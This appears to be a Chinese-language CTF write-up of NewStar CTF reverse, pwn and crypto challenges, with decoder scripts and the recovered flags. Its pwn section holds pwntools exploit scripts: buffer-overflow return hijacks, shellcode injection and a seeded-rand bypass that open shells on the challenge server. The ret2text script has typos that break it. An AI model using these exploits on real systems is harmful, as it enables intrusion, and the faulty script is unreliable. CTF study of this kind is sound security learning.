<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_decode</span>(<span class="params">encoded_str</span>):</span><br><span class="line">    custom_base64_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    standard_base64_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    translation = <span class="built_in">str</span>.maketrans(custom_base64_chars, standard_base64_chars)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(encoded_str.translate(translation))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">encoded_bytes</span>):</span><br><span class="line">    decoded_chars = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_bytes:</span><br><span class="line">        char = <span class="built_in">chr</span>((byte - <span class="number">16</span>) ^ <span class="number">0x20</span>)</span><br><span class="line">        decoded_chars.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decoded_chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoded_str = <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span></span><br><span class="line"><span class="built_in">print</span>(xor(custom_base64_decode(encoded_str)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span><br></pre></td></tr></table></figure>



<h2 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h2><p>die查壳是upx4.0.2 , 在这里下载<a target="_blank" rel="noopener" href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a> </p>
<p>然后upx -d filename 脱壳</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;Str1[<span class="built_in">strlen</span>(Str1)];</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= v4 - Str1 )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ++Str1[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, enc, v4 - Str1) )</span><br></pre></td></tr></table></figure>

<p>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</p>
<p>大概是吧str1全部++了一边 –回去就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span><br><span class="line">flag = [c for c in flag]</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag[i] = chr(ord(flag[i]) - 1)</span><br><span class="line">    print(flag[i] , end=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h2><p>shift_f7 打开段视图，然后拼接flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</span><br></pre></td></tr></table></figure>



<h2 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h2><p>关键逻辑在这里，能看到长度，还有异或的操作，只需要根据happyx3 还有 cArr置反就能得到inputString</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">Xor</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] cArr = &#123;<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;;</span><br><span class="line">        <span class="type">char</span>[] cArr2 = <span class="keyword">new</span> <span class="title class_">char</span>[str.length()];</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> str.length() != <span class="number">25</span> ? <span class="string">&quot;wrong!!!&quot;</span> : <span class="string">&quot;you win!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">charAt</span> <span class="operator">=</span> (<span class="type">char</span>) (str.charAt(i) ^ str2.charAt(i % str2.length()));</span><br><span class="line">            cArr2[i] = charAt;</span><br><span class="line">            <span class="keyword">if</span> (cArr[i] != charAt) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str3;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Toast.makeText(mainActivity, mainActivity.Xor(obj, <span class="string">&quot;happyx3&quot;</span>), <span class="number">1</span>).show();</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line">cArr = [<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>]</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(cArr[i] ^ <span class="built_in">ord</span>(str2[i % <span class="built_in">len</span>(str2)])) <span class="keyword">if</span> <span class="built_in">isinstance</span>(cArr[i], <span class="built_in">int</span>) <span class="keyword">else</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(cArr[i]) ^ <span class="built_in">ord</span>(str2[i % <span class="built_in">len</span>(str2)])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cArr))])</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3z_And0r1d_X0r_x1x1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h2><p>这里v5是个指针来的，一开始看有些怪，过一会就懂了。需要再异或一次，然后按字节拆分数字，小端序转大端序就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  v5 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_and_combine</span>(<span class="params">hex_values</span>):</span><br><span class="line">    </span><br><span class="line">    xor_results = [<span class="built_in">hex</span>(<span class="built_in">int</span>(value, <span class="number">16</span>) ^ <span class="number">0x12345678</span>) <span class="keyword">for</span> value <span class="keyword">in</span> hex_values]</span><br><span class="line"></span><br><span class="line">    reversed_strings = []</span><br><span class="line">    <span class="keyword">for</span> xor_result <span class="keyword">in</span> xor_results:</span><br><span class="line">        xor_result = xor_result[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        result_string = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(xor_result[i:i + <span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>)])</span><br><span class="line">        reversed_strings.append(result_string[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    combined_string = <span class="string">&quot;&quot;</span>.join(reversed_strings)</span><br><span class="line"></span><br><span class="line">   	<span class="keyword">return</span> combined_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;75553A1E&quot;</span>, <span class="string">&quot;7B583A03&quot;</span>, <span class="string">&quot;4D58220C&quot;</span>, <span class="string">&quot;7B50383D&quot;</span>, <span class="string">&quot;736B3819&quot;</span>]</span><br><span class="line">inputString = process_and_combine(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inputString)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;llittl_Endian_a&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h2><p>修复pe头的话，找个exe 010edit从开始到0x70h那一行粘贴一下，就好了</p>
<p>异或置反一下就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, </span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, </span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>, </span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">input_recovered = [<span class="number">0</span>] * <span class="built_in">len</span>(data)</span><br><span class="line">input_recovered[-<span class="number">1</span>] = data[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    input_recovered[i] = data[i] ^ (i ^ input_recovered[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> input_recovered:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span><br></pre></td></tr></table></figure>



<h2 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h2><p>activtiy是提供用户界面，可以使用户交互的，程序中有个flag activtiy但是主界面没有什么地方能够调用这个activity的搜了一下可以用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity</span><br></pre></td></tr></table></figure>

<p>这个命令adb shell的命令来调用一个应用的activtiy</p>
<p>这边是flag activity的关键逻辑，可以反编译然后将10000改成1就好了。但是折腾了好久apktools反编译打包有问题，还有签名那，后面找了一个安卓修改大师破解版，一键打包签名就正常了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Act1v1ty_!s_so00oo0o_Impor#an#&#125;</span><br></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>有个backdoor函数，溢出后跳过去就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">29750</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Welcome to NewStar CTF!!</span></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Show me your magic</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor_address = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">paylaod += backdoor_adress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>shellcode输入后会直接jmp到buf那，所以只需要把shellcode输入就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ezshellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">29750</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Welcome to NewStar CTF!!</span></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Show me your magic</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode  =  asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h2><p>选1进商店买到没钱然后选3 -50后，uint溢出就能直接买&#x2F;bin sh了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8b42af7c-c695-489a-ad79-1bff9d84f52c&#125;</span><br></pre></td></tr></table></figure>



<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><p>咱是笨蛋，习惯性看ida中的函数视图了，没注意到关键函数下面有个用_asm{}写的直接system bin sh的块，pie的话低三位16进制的地址是不变的，所以只需要在return位置那填充低位地址，根据原有的高位地址，就能跳过去。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001264 ; __unwind &#123;</span><br><span class="line">.text:0000000000001264                 endbr64</span><br><span class="line">.text:0000000000001268                 push    rbp</span><br><span class="line">.text:0000000000001269                 mov     rbp, rsp</span><br><span class="line">.text:000000000000126C                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000001273                 call    _system</span><br><span class="line">.text:0000000000001278                 nop</span><br><span class="line">.text:0000000000001279                 pop     rbp</span><br><span class="line">.text:000000000000127A                 retn</span><br><span class="line">.text:000000000000127A ; &#125; // starts at 1264</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./p1eee&#x27;</span>)</span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">26886</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span> + <span class="number">8</span>) + p8(<span class="number">0x6C</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cc6d8d8e-cae4-4f5d-88b5-8ddd66f66a2c&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>可以用ctypes 调用libc中的time srand rand函数，校园网好卡，去外边才打通了，要多跑几遍，随机数拼凑字符对了才可以</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29912475/article/details/130319284">https://blog.csdn.net/qq_29912475/article/details/130319284</a> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./Random&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">25248</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化函数返回值</span></span><br><span class="line">libc.time.restype = ctypes.c_long</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用函数</span></span><br><span class="line">time_value = ctypes.c_longlong(<span class="number">0</span>)</span><br><span class="line">seed = libc.time(ctypes.byref(time_value))</span><br><span class="line">libc.srand(seed)</span><br><span class="line">rand_result = libc.rand()</span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(rand_result))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f5be13ec-f7f0-4dea-ab64-31470e102fbf&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>可以用这个解密 <a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</span><br></pre></td></tr></table></figure>

